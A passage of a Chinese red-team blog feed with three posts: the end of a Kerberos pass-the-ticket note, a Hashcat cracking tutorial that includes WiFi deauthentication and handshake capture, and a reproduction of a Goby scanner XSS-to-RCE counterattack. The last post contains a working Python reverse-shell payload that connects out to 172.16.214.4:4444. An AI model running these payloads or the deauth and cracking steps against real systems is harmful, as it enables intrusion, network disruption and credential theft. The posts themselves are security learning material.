src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901154851.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在 kekeo 中清楚当前内存中的其他票据，不然可能会导致票据传递失败</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用以下命令将票据导入内存，之后 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了。</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901155501.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>注意点：</p><p>1、票据文件注入内存的默认有效时间为 10 小时</p><p>2、在目标机器上不需要本地管理员权限就可以进行票据传递</p><p>3、使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问。</p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/Xy--1/p/13216686.html">https://www.cnblogs.com/Xy–1/p/13216686.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】20、Hashcat 的使用</title>
      <link href="//210831-122611.html"/>
      <url>//210831-122611.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。</p><p>工具地址：<a href="https://hashcat.net/">https://hashcat.net</a></p><p>项目地址：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>Mac 用户直接使用 brew 安装即可</p><pre class="line-numbers language-none"><code class="language-none">brew install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>对于 Debain 的 Linux，比如 Kali、Ubuntu 可以直接使用 apt 进行安装</p><pre class="line-numbers language-none"><code class="language-none">apt install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者下载官方二进制文件进行安装</p><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，这里以 6.2.4 版为例</p><pre class="line-numbers language-none"><code class="language-none">tar zxvf hashcat-6.2.4.7zcd hashcat-6.2.4chmod +x hashcat.bin.&#x2F;hashcat.bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，解压后可以看到 hashcat.exe</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>常用参数：</p><pre class="line-numbers language-none"><code class="language-none">-r使用自定义破解规则-o指定破解成功后的 hash 及所对应的明文密码的存放位置-m指定要破解的 hash 类型，如果不指定类型，则默认是 MD5-a指定要使用的破解模式，其值参考后面对参数。“-a 0” 字典攻击，“-a 1” 组合攻击；“-a 3” 掩码攻击-D指定 opencl 的设备类型--show显示已经破解的 hash 及该 hash 所对应的明文--force忽略破解过程中的警告信息,跑单条 hash 可能需要加上此选项--remove删除已被破解成功的 hash--username忽略 hash 文件中的指定的用户名,在破解 linux 系统用户密码 hash 可能会用到--increment启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程--increment-min密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用--increment-max密码最大长度,同上--outfile-format指定破解结果的输出格式 id ,默认是 3--self-test-disable    关闭启动自检<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-a 破解模式：</p><pre class="line-numbers language-none"><code class="language-none">0 | Straight（字段破解）1 | Combination    （组合破解）3 | Brute-force    （掩码暴力破解）6 | Hybrid Wordlist + Mask（字典+掩码破解）7 | Hybrid Mask + Wordlist（掩码+字典破解）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-D 指定设备类型</p><pre class="line-numbers language-none"><code class="language-none">1 | CPU2 | GPU3 | FPGA, DSP, Co-Processor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一般使用 -D 2 指定 GPU 破解</p><p>掩码设置：</p><pre class="line-numbers language-none"><code class="language-none">l | abcdefghijklmnopqrstuvwxyz纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ纯大写字母d | 0123456789纯数字h | 0123456789abcdef十六进制小写字母和数字H | 0123456789ABCDEF    十六进制大写字母和数字s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~    特殊字符a | ?l?u?d?s键盘上所有可见的字符b | 0x00 - 0xff匹配密码空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>掩码设置举例：</p><pre class="line-numbers language-none"><code class="language-none">八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自定义掩码规则：</p><pre class="line-numbers language-none"><code class="language-none">--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在掩码中用 ?1、?2、?3、?4 来表示</p><p>注意：</p><ul><li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li><li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li></ul><p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p><h2 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>密码为 8 位数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force d54d1702ad0f8326224b817c796763c9 ?d?d?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 4 位小写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 4575621b0d88c303998e63fc74d165b0 -1 ?l?d ?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 1-4 位大写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min 1 --increment-max 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定特定字符集：123456abcdf!@+- 进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf\!\@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 e10adc3949ba59abbe56e057f20f883e password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典批量破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 hash.txt password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字典组合破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 1 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p><p>pwd1.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">admintestroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>pwd2.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">@2021123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么组合后的字典就是这样的：</p><pre class="line-numbers language-none"><code class="language-none">admin@2021admin123test@2021test123root@2021root123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 6 e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p></blockquote><h3 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X.&#39; ?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可通过 cat /etc/shadow 获取哈希值</p></blockquote><p>或者不删除用户名，直接使用 –username 参数</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>NT Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NetNTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 5500 teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 400 --force &#39;$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F;&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p></blockquote><h3 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>其密码加密方式 md5(md5($pass).$salt)</p></blockquote><h3 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h3><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来。</p><p>rar2john 下载地址：<a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p><pre class="line-numbers language-none"><code class="language-none"># 获取 rar 文件 hashrar2john.exe 1.rar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>hashcat 支持 RAR3-hp 和 RAR5</p><p>对于 RAR5，示例如下：</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13000 --force &#39;$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于 RAR3-hp</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 12500 --force &#39;$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb&#39; ?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp</p><p>关于 RAR 参数 -p 和 -hp 的区别：<br>-p：只对 RAR 文件加密，里面的目录和文件名没加密；<br>-hp：对目录中的文件名和子目录都进行加密处理</p></blockquote><h3 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h3><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 zip 文件 hashzip2john.exe 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13600 &#39;$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$&#x2F;zip2$&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里 ZIP 的加密算法使用的 AES256</p></blockquote><h3 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h3><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 office 文件 hashpython office2john.py 1.docx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p></blockquote><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 9600 &#39;$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式。</p></blockquote><h3 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h3><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了。</p><p><strong>抓取 WIFI 握手包</strong></p><p>1、将网卡处于监听状态</p><pre class="line-numbers language-none"><code class="language-none">airmon-ng check airmon-ng check kill &#x2F;&#x2F; 关闭影响监听状态的进程airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p></blockquote><p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p><p>2、扫描可用 WIFI</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831104636.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>3、获取wifi的握手包</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里以 ssid 为 teamssix 的 WIFI 为例</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c 1 --bssid 5E:C1:1B:A2:37:F1 -w .&#x2F; wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831105351.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 38:26:2C:13:D3:33 wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待设备重新连接后，当右上角出现 WPA handshake 的时候说明获取成功</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831132010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>4、破解密码</p><p>使用 aircrack-ng 将握手包转换成 hccapx 格式</p><pre class="line-numbers language-none"><code class="language-none">aircrack-ng 1.cap -j 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2500 1.hccapx ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 官网提供的在线工具进行格式转换：<a href="https://hashcat.net/cap2hashcat/">https://hashcat.net/cap2hashcat/</a></p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 22000 1.hc22000 ?d?d?d?d?d?d?d?d --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210831113326.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h2><ul><li><p>Hashcat 在有时破解的时候会提示 All hashes found in potfile!，这表明该 hash 已经被破解出来过了，可以使用 hashcat [哈希值] –show 查看已破解出来的明文密码。</p></li><li><p>如果想再次破解已经破解过的密码，删除 ~/.hashcat/hashcat.potfile 文件里的对应记录即可。</p></li><li><p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p></li><li><p>在实际破解过程中，可以先使用 top 字典进行破解，不行再试试社工字典，比如姓名+生日的组合字典</p></li><li><p>Hashcat 参数优化：</p></li></ul><pre class="line-numbers language-none"><code class="language-none">--gpu-accel 160可以让GPU发挥最大性能--gpu-loops 1024可以让GPU发挥最大性能--segment-size 512    可以提高大字典破解的速度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p><p><a href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a></p><p><a href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a></p><p><a href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a></p><p><a href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反制 Goby RCE 复现及 Mac 用户防御策略</title>
      <link href="//210813-153545.html"/>
      <url>//210813-153545.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近看到网上反制 Goby 的文章，而自己平时 Mac 一直是裸奔的状态，这下整的自己有点慌了，这里就来记录下反制 Goby RCE 的复现以及 Mac 用户的防御策略。</p><h1 id="0x01-反制-Goby-RCE-复现"><a href="#0x01-反制-Goby-RCE-复现" class="headerlink" title="0x01 反制 Goby RCE 复现"></a>0x01 反制 Goby RCE 复现</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>为了方便，这里直接使用 PhpStudy 了，这里的 PhpStudy 地址为 <a href="http://172.16.214.4/">http://172.16.214.4</a> ，直接将 Web 服务里的 index.php 改为以下内容。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&quot;X-Powered-By: PHP&#x2F;&lt;imgsrc&#x3D;1onerror&#x3D;alert(\&quot;TeamsSix@WgpSec\&quot;)&gt;&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Goby 在扫描到 <a href="http://172.16.214.4/">http://172.16.214.4</a> 后，点击扫描结果里的 172.16.214.4  就会弹窗了。</p><blockquote><p>注意扫描结果里一定要点击对应的 IP 才行，比如我这里的 IP 是 172.16.214.4，不然是触发不了的</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813145503.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813144712.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE 需要再新建一个 js 文件，这里我在 172.16.214.4 的 www 目录下新建了一个名为 mac 的 js 文件，js 内容如下：</p><pre class="line-numbers language-none"><code class="language-none">(function()&#123;require(&#39;child_process&#39;).exec(&#39;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&#39;);require(&#39;child_process&#39;).exec(&#39;python -c \&#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.214.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);\&#39;&#39;);&#125;)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行这段 JS 会在本地打开计算器，并利用 Python 反弹 Shell 到 172.16.214.4 主机的 4444端口。</p><p>之后将 index.php 修改如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&quot;X-Powered-By: PHP&#x2F;&lt;imgsrc&#x3D;1onerror&#x3D;import(unescape(&#39;http%3A&#x2F;&#x2F;172.16.214.4&#x2F;mac.js&#39;))&gt;&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>172.16.214.4 上使用 NC 开启 4444 端口监听后，Goby 开启扫描，点击扫描结果里的 172.16.214.4 的详细信息，成功反弹 Shell.</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813150226.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-Mac-用户防御策略"><a href="#0x02-Mac-用户防御策略" class="headerlink" title="0x02 Mac 用户防御策略"></a>0x02 Mac 